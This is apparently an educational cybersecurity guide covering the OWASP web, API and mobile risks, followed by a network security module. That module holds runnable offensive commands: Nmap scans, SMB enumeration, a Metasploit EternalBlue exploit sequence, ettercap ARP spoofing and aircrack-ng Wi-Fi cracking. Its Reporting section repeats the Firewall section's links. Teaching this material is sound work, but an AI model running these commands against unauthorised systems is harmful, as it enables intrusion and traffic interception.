## 💻 Web Application Security Labs (OWASP Top 10)

This section focuses on **hands-on practice for common web application vulnerabilities**  
as defined by the **OWASP Top 10 (2021)**. These labs help you **practice, understand, and report vulnerabilities safely**.

---

### 🔴 A01: Broken Access Control (IDOR)

- **Objective:** Learn how improper access control allows unauthorized access.  
- **Example:** Access another user’s profile by changing an ID in the URL.  
- **Practice Labs:** DVWA, OWASP Juice Shop  
- **Impact:** Data leakage, privilege escalation  

**Resources:**  
- [OWASP Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)  
- [YouTube IDOR Exploit Tutorial](https://www.youtube.com/watch?v=YF7_lgyVfVQ)  
- [Medium Writeup – IDOR Explained](https://medium.com/@shubhamsoni99/idor-vulnerability-explained-9a30e6b6a4a6)

---

### 🔴 A02: Cryptographic Failures

- **Objective:** Identify weak or missing encryption.  
- **Example:** Passwords stored in plain text, HTTP instead of HTTPS.  
- **Practice Labs:** OWASP Juice Shop  
- **Impact:** Exposure of sensitive data  

**Resources:**  
- [OWASP Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/)  
- [YouTube Tutorial](https://www.youtube.com/watch?v=QmSxFJZcKZk)  
- [PortSwigger Blog – Cryptographic Failures](https://portswigger.net/web-security/cryptographic-failures)

---

### 🔴 A03: Injection (SQLi, Command Injection)

- **Objective:** Learn how untrusted input can execute malicious commands.  
- **Practice Labs:** DVWA, PortSwigger Labs  
- **Impact:** Database compromise, remote code execution  

**Resources:**  
- [OWASP Injection](https://owasp.org/www-community/attacks/Injection)  
- [YouTube SQL Injection Tutorial](https://www.youtube.com/watch?v=ciNHn38EyRc)  
- [Medium – SQL Injection 101](https://medium.com/@hacker101/sql-injection-101-beginners-guide-7f62e3b9e36c)

---

### 🔴 A04: Insecure Design

- **Objective:** Learn vulnerabilities caused by poor application design.  
- **Practice Labs:** OWASP Juice Shop  
- **Impact:** Abuse of business logic  

**Resources:**  
- [OWASP Insecure Design](https://owasp.org/Top10/A04_2021-Insecure_Design/)  
- [OWASP Insecure Design Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Design_Cheat_Sheet.html)  
- [YouTube Tutorial](https://www.youtube.com/watch?v=K9sR5xZb9l8)

---

### 🔴 A05: Security Misconfiguration

- **Objective:** Identify insecure default configurations.  
- **Example:** Exposed admin panels, verbose error messages  
- **Practice Labs:** DVWA, Juice Shop  
- **Impact:** Unauthorized access, information disclosure  

**Resources:**  
- [OWASP Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)  
- [YouTube Tutorial](https://www.youtube.com/watch?v=3p7D6y0xVbU)  
- [Medium – Security Misconfiguration Explained](https://medium.com/@thecyberhub/security-misconfiguration-explained-5f3bce6c6f41)

---

### 🔴 A06: Vulnerable & Outdated Components

- **Objective:** Identify risks from outdated libraries or frameworks.  
- **Example:** Vulnerable jQuery, Log4j, or NPM packages  
- **Practice Labs:** Dependency scanning tools, Juice Shop  
- **Impact:** Remote exploitation  

**Resources:**  
- [OWASP Vulnerable Components](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/)  
- [YouTube Tutorial](https://www.youtube.com/watch?v=8U3mZ5rP9Xs)  
- [PortSwigger Blog – Outdated Components](https://portswigger.net/web-security/vulnerable-outdated-components)

---

### 🔴 A07: Identification & Authentication Failures

- **Objective:** Understand weak authentication mechanisms  
- **Example:** Weak passwords, session fixation  
- **Practice Labs:** DVWA, WebGoat  
- **Impact:** Account takeover  

**Resources:**  
- [OWASP Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)  
- [YouTube Tutorial](https://www.youtube.com/watch?v=R_9zG-8c3nY)  
- [Medium – Session Fixation Explained](https://medium.com/@pradeep.raghav/session-fixation-explained-3f8d90c9bfa3)

---

### 🔴 A08: Software & Data Integrity Failures

- **Objective:** Learn risks from untrusted updates or insecure CI/CD pipelines.  
- **Example:** Insecure deserialization, unverified updates  
- **Practice Labs:** WebGoat  
- **Impact:** Code execution, supply chain attacks  

**Resources:**  
- [OWASP Software & Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)  
- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)  
- [YouTube Tutorial](https://www.youtube.com/watch?v=Ew5t4pGdT9E)

---

### 🔴 A09: Security Logging & Monitoring Failures

- **Objective:** Understand importance of proper logging and monitoring  
- **Example:** No alerts on failed logins, missing audit trails  
- **Practice Labs:** Juice Shop  
- **Impact:** Delayed detection of attacks  

**Resources:**  
- [OWASP Logging & Monitoring Failures](https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/)  
- [YouTube Tutorial](https://www.youtube.com/watch?v=3kPZqz3nK4A)  
- [PortSwigger Blog](https://portswigger.net/web-security/logging-monitoring)

---

### 🔴 A10: Server-Side Request Forgery (SSRF)

- **Objective:** Learn how attackers abuse server functionality to make internal requests  
- **Example:** Access internal metadata services via SSRF  
- **Practice Labs:** PortSwigger Labs  
- **Impact:** Internal network exposure, sensitive data leakage  

**Resources:**  
- [OWASP SSRF](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_(SSRF)/)  
- [YouTube Tutorial](https://www.youtube.com/watch?v=Q1lZ5J7FZxE)  
- [Medium SSRF Writeup](https://medium.com/@knownsec404team/ssrf-explained-with-examples-6c9f4b9c15a7)

---

## 🎯 Learning Outcome

By completing these labs, you will:

- Understand **all OWASP Top 10 vulnerabilities**  
- Learn **manual testing techniques**  
- Practice **real-world exploitation scenarios**  
- Build strong **reporting and remediation skills**

---

## 📡 API Security – Hands-On Learning 
APIs are the backbone of modern applications (web, mobile, cloud, microservices).  
API vulnerabilities often lead to **mass data exposure**, **account takeovers**, and **business logic abuse**.

This section is aligned with the **OWASP API Security Top 10** and focuses on **real-world testing techniques**.

---

### 🔴 API1: Broken Object Level Authorization (BOLA)

**What it is:**  
When an API fails to verify whether the user is allowed to access a specific object.

**Example:**  
Changing `user_id=101` to `user_id=102` in an API request and accessing another user’s data.

**How to Practice:**  
- Intercept API requests using **Burp Suite / Postman**
- Modify object IDs in parameters or JSON bodies

**Tools:**  
- Postman  
- Burp Suite  
- OWASP API Security Labs  

**Why It Matters:**  
This is the **most critical API vulnerability** and leads to massive data breaches.

**Resources:**  
- [OWASP API1 – BOLA](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
- [YouTube – BOLA Explained](https://www.youtube.com/watch?v=8RJ2Cw6hLMk)
- [Medium Writeup](https://medium.com/@vaibhav0109/broken-object-level-authorization-bola-explained-3f88c3b5c1b1)

---

### 🔴 API2: Broken Authentication

**What it is:**  
Weak or missing authentication mechanisms in APIs.

**Examples:**  
- Missing JWT validation  
- Predictable tokens  
- Tokens not expiring

**Hands-On Practice:**  
- Try accessing endpoints without tokens  
- Replay expired tokens  
- Test weak password policies

**Resources:**  
- OWASP API2 – Broken Authentication  
  https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/  
- YouTube Tutorial  
  https://www.youtube.com/watch?v=QmSxFJZcKZk  
- PortSwigger Guide  
  https://portswigger.net/web-security/authentication  

---

### 🔴 API3: Broken Object Property Level Authorization (Mass Assignment)

**What it is:**  
APIs allow users to modify sensitive fields they shouldn’t have access to.

**Example:**  
Adding `"role": "admin"` in a JSON request body.

**Hands-On Practice:**  
- Send extra parameters in API requests  
- Observe server behavior

**Resources:**  
- [OWASP API3 – Mass Assignment](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/)
- [Medium Blog](https://medium.com/swlh/mass-assignment-vulnerability-explained-7a244a12f62c)
- [YouTube Tutorial](https://www.youtube.com/watch?v=1ABFSyzQx2Y)

---

### 🔴 API4: Lack of Rate Limiting

**What it is:**  
APIs allow unlimited requests leading to brute force and DoS attacks.

**Practice Scenario:**  
- Send multiple login requests rapidly  
- Observe if account lockout exists

**Resources:**  
- [OWASP API4 – Unrestricted Resource Consumption](https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/)
- [YouTube Tutorial](https://www.youtube.com/watch?v=5_KL3Fje31s)

---

### 🔴 API5: Excessive Data Exposure

**What it is:**  
APIs return more data than necessary.

**Example:**  
Returning passwords, tokens, or internal IDs in responses.

**Resources:**  
- [OWASP API5 – Excessive Data Exposure](https://owasp.org/API-Security/editions/2023/en/0xa5-excessive-data-exposure/)
- [Medium Writeup](https://medium.com/@cybersec/excessive-data-exposure-in-apis-1a7f3c7c3b9d)

---

### 🧪 Recommended API Practice Platforms

- [OWASP API Security Labs](https://github.com/OWASP/API-Security)
- [PortSwigger API Labs](https://portswigger.net/web-security/api-security)
- [Postman API Playground](https://learning.postman.com)
---

## 📱 Mobile Application Security – Hands-On Learning 

Mobile applications often handle **sensitive user data** and rely heavily on APIs.  
This section follows **OWASP Mobile Top 10** and **Mobile Security Testing Guide (MSTG)**.

---

### 📱 Android Security Testing

#### 🔴 Insecure Data Storage

**What it is:**  
Sensitive data stored in plain text (SharedPreferences, SQLite, files).

**Hands-On Practice:**  
- Analyze APK using **MobSF**
- Look for stored credentials or tokens

**Resources:**  
- [OWASP M1 – Insecure Data Storage](https://owasp.org/www-project-mobile-top-10/2016-risks/m1-insecure-data-storage)
- [YouTube – Android Insecure Storage](https://www.youtube.com/watch?v=Z8jDQXhfjH0)
- [MSTG Storage Guide](https://mobile-security.gitbook.io/mobile-security-testing-guide/android-testing-guide/android-local-storage)

---

#### 🔴 Insecure Permissions

**What it is:**  
Apps requesting unnecessary or dangerous permissions.

**Practice:**  
- Review AndroidManifest.xml  
- Identify over-privileged apps

**Resources:**  
- [OWASP Android Permissions](https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage)
- [YouTube Tutorial](https://www.youtube.com/watch?v=9O9Jv2k1ZQk)

---

### 🍎 iOS Security Testing

#### 🔴 Insecure Keychain Usage

**What it is:**  
Sensitive data stored insecurely in the iOS Keychain.

**Practice:**  
- Analyze IPA using **MobSF**
- Check encryption and access control

**Resources:**  
- [MSTG iOS Storage](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/ios-local-storage)
- [YouTube iOS Security Testing](https://www.youtube.com/watch?v=fHlMJ2Em5IQ)

---

#### 🔴 Weak SSL / Certificate Pinning

**What it is:**  
Apps trusting any SSL certificate → Man-in-the-Middle attacks.

**Hands-On Practice:**  
- Use Burp Suite with a mobile emulator  
- Observe HTTPS traffic

**Resources:**  
- [OWASP M3 – Insecure Communication](https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication)
- [YouTube SSL Pinning Bypass](https://www.youtube.com/watch?v=Kc0XzH1A9pA) 

---

## 🧪 Mobile Practice Platforms & Tools

- [Mobile Security Testing Guide (MSTG)](https://mobile-security.gitbook.io/)
- [MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF)
- Android Emulator / iOS Simulator
- Burp Suite

---

## 🎯 Learning Outcome

By completing this section, you will be able to:

- Test **real-world API vulnerabilities**
- Understand **mobile app attack surfaces**
- Perform **static & dynamic mobile analysis**
- Secure APIs used by web and mobile apps
- Write **professional security findings**

---


# 🌐 Network Security – Beginner to Advanced (Step‑by‑Step Learning Module)

This module is designed for **absolute beginners in cybersecurity** and gradually progresses to **advanced network security concepts** with **hands‑on labs**, **real commands**, and **trusted learning resources**.

⚠️ All activities must be performed **only on systems you own or have explicit permission to test**.

---

## 📌 Learning Roadmap

1. Network Fundamentals  
2. Protocols & Ports  
3. Linux Networking Basics  
4. Network Reconnaissance  
5. Scanning & Enumeration  
6. Packet Sniffing & Traffic Analysis  
7. Vulnerability Scanning  
8. Exploitation Fundamentals  
9. Man‑in‑the‑Middle Attacks  
10. Wireless (Wi‑Fi) Security  
11. Firewalls, IDS & IPS  
12. Network Security Reporting  
13. Practice Platforms

---

## 1️⃣ Network Fundamentals

### Concepts
- What is a Network (LAN, WAN, MAN)
- IP Address (IPv4, IPv6)
- Public vs Private IP
- MAC Address
- Subnetting & CIDR
- OSI Model
- TCP/IP Model

### Why This Is Important
Understanding how data flows in a network is **mandatory before learning attacks or defense**.

### Resources
- Networking Basics (YouTube): https://www.youtube.com/watch?v=3QhU9jd03a0
- OSI Model Explained: https://www.youtube.com/watch?v=vv4y_uOneC0
- Networking for Beginners (Medium): https://medium.com/@networksecurity/networking-basics-for-beginners-9d8f5b62f43b
- Networking Tutorials: https://www.geeksforgeeks.org/computer-network-tutorials/

---

## 2️⃣ Protocols & Common Ports

| Protocol | Port | Description |
|--------|------|------------|
| HTTP | 80 | Web traffic |
| HTTPS | 443 | Secure web |
| FTP | 21 | File transfer |
| SSH | 22 | Secure remote access |
| Telnet | 23 | Insecure remote login |
| SMTP | 25 | Email |
| DNS | 53 | Domain resolution |
| SMB | 445 | File sharing |

### Resources
- Ports Explained (YouTube): https://www.youtube.com/watch?v=4Q7FTjhvZ7Y
- Common Ports (Medium): https://medium.com/@cybersecurity101/common-ports-and-protocols-every-hacker-should-know-1c65db4f6a73
- Port Reference: https://www.speedguide.net/ports.php

---

## 3️⃣ Linux Networking Commands

### Practice These Commands
```bash
ifconfig
ip a
ping google.com
netstat -tulnp
ss -tulnp
traceroute google.com
nslookup google.com
dig google.com

````
### Resources
- [Linux Networking Commands (YouTube)](https://www.youtube.com/watch?v=G4uKZ9sAqXc)
- [Linux Networking Explained (Medium)](https://medium.com/@linuxops/linux-networking-commands-explai)

Perform scanning, sniffing, vulnerability analysis, and attacks safely
Think like both an attacker and a defender
Be prepared for SOC, network security, or penetration testing roles


## 4️⃣ Network Reconnaissance (Nmap)

### 🎯 Goal
Learn how to discover live hosts, open ports, running services, and operating system details on a network.  
Network reconnaissance is the **first and most critical step** in any network security assessment or penetration test.

---

### 🛠️ Tool Used
- **Nmap (Network Mapper)**

---

### 📌 Practice These Commands

```bash
# Discover live hosts in a subnet (Ping Scan)
nmap -sn 192.168.1.0/24

# Basic port scan on a target
nmap 192.168.1.10

# Service and version detection
nmap -sV 192.168.1.10

# Aggressive scan (OS detection, services, scripts)
nmap -A 192.168.1.10

# Scan all 65,535 ports
nmap -p- 192.168.1.10
````

---

### 📘 What You Learn from This Module

- How attackers discover systems on a network
- Identifying exposed services and risky ports
- Understanding service versions that may be vulnerable
- Basics of OS fingerprinting
- Why open ports increase the attack surface

---

### 📚 Resources

#### 🎥 YouTube
- [Nmap Beginner Tutorial](https://www.youtube.com/watch?v=rc5a3hE_7a4)
- [Complete Nmap Guide](https://www.youtube.com/watch?v=4t4kBkMsDbQ)

#### ✍️ Medium / Blogs
- [Nmap for Beginners](https://medium.com/@cybersec_explained/nmap-for-beginners-9d7c4c64cdb1)
- [Network Scanning Explained](https://medium.com/@infosecwriteups/network-scanning-for-beginners-6aef1c8f64a0)

#### 📖 Official Documentation

- [Nmap Official Manual](https://nmap.org/book/man.html)

#### 🧪 Hands‑On Practice

- [TryHackMe Nmap Room](https://tryhackme.com/room/nmap)
- [Hack The Box Academy – Nmap](https://academy.hackthebox.com/course/preview/network-enumeration-with-nmap)
---


## 5️⃣ Network Scanning & Enumeration

### 🛠️ Tools Used

- Nmap (NSE Scripts)
- enum4linux
- smbclient

### 📌 Practice These Commands

```bash
nmap --script vuln 192.168.1.10
enum4linux 192.168.1.10
smbclient -L \\192.168.1.10
```

### 📚 Resources
- [Enumeration Explained (YouTube)](https://www.youtube.com/watch?v=3Kq1MIfTWCE)
- [Enumeration for Beginners (Medium)](https://medium.com/@infosecwriteups/enumeration-for-beginners-9b0f7fefc11e)

---

## 6️⃣ Packet Sniffing & Traffic Analysis (Wireshark)

### 🔍 What to Look For

- Clear‑text credentials
- Cookies and session tokens
- Insecure protocols (HTTP, FTP, Telnet)

### 📌 Useful Filters

```text
http
ftp
tcp.port == 21
ip.addr == 192.168.1.10
```

### 📚 Resources
- [Wireshark Full Course (YouTube)](https://www.youtube.com/watch?v=YKx9c6r-Dw0)
- [Wireshark for Beginners (Medium)](https://medium.com/@networksecurity/wireshark-for-beginners-a-complete-guide-7c6b0b7e15d6)
- [Wireshark Official Labs](https://www.wireshark.org/labs/)

---

## 7️⃣ Vulnerability Scanning

### 🛠️ Tools

- Nessus
- OpenVAS

### 📘 What You Learn

- CVE identification
- CVSS scoring
- Service and configuration weaknesses

### 📚 Resources

- [Nessus Beginner Tutorial (YouTube)](https://www.youtube.com/watch?v=OdSGrhZkSbg)
- [Vulnerability Scanning for Beginners (Medium)](https://medium.com/@infosecwriteups/vulnerability-scanning-for-beginners-6f8a1c2e2c94)
- [OpenVAS Official Website](https://www.openvas.org/)

---

## 8️⃣ Exploitation Fundamentals (Metasploit)

### 📌 Practice These Commands

```bash
msfconsole
search smb
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
run
```

### 📚 Resources

- [Metasploit Full Course (YouTube)](https://www.youtube.com/watch?v=HLbH_xpJknY)
- [Metasploit Unleashed (Official)](https://www.offensive-security.com/metasploit-unleashed/)
- [TryHackMe Metasploit Room](https://tryhackme.com/room/metasploit)

---

## 9️⃣ Man‑in‑the‑Middle (MITM) Attacks

### 📌 Practice These Commands

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
ettercap -T -q -i eth0 -M arp:remote /victim_ip/ /gateway_ip/
```

### 📚 Resources

- [MITM Explained (YouTube)](https://www.youtube.com/watch?v=0X6hq8vEJXk)
- [MITM Attacks Explained (Medium)](https://medium.com/@cybersecurity101/man-in-the-middle-attack-explained-with-examples-3c2f5d19b8d1)

---

## 🔟 Wireless (Wi‑Fi) Security

### 📌 Practice These Commands

```bash
airmon-ng start wlan0
airodump-ng wlan0mon
aircrack-ng -w wordlist.txt capture.cap
```

### 📚 Resources

- [Wi‑Fi Security Tutorial (YouTube)](https://www.youtube.com/watch?v=Txj2xztEd4k)
- [Aircrack‑ng Documentation](https://www.aircrack-ng.org/)
- [TryHackMe Wi‑Fi Security Room](https://tryhackme.com/room/wifi)
---

## 1️⃣1️⃣ Firewalls, IDS & IPS

### 🛠️ Tools

- pfSense (Firewall)
- Snort (IDS/IPS)
- Suricata (IDS/IPS)

### 📚 Resources
- [pfSense Tutorial (YouTube)](https://www.youtube.com/watch?v=vC7v9w6xE5s)
- [Snort Official Documentation](https://www.snort.org/documents)
- [IDS vs IPS Explained (Medium)](https://medium.com/@blue_team/ids-vs-ips-explained-9c6a23c4fdb1)

---

## 1️⃣2️⃣ Network Security Reporting

### 📝 Report Should Include

- Scope
- Tools Used
- Findings
- Risk and Impact
- Remediation

### 📚 Resources
- [pfSense Tutorial (YouTube)](https://www.youtube.com/watch?v=vC7v9w6xE5s)
- [Snort Official Documentation](https://www.snort.org/documents)
- [IDS vs IPS Explained (Medium)](https://medium.com/@blue_team/ids-vs-ips-explained-9c6a23c4fdb1)
---

## 1️⃣3️⃣ Practice Platforms

- [TryHackMe](https://tryhackme.com)
- [Hack The Box](https://www.hackthebox.com)
- [OverTheWire](https://overthewire.org)

---

## 🎯 Final Outcome

After completing this module, you will:

- Understand network security from reconnaissance to exploitation
- Perform real‑world assessments responsibly
- Be prepared for SOC, Network Security, or Pentesting roles

⚠️ **Disclaimer:** Educational purposes only. Unauthorized testing is illegal.





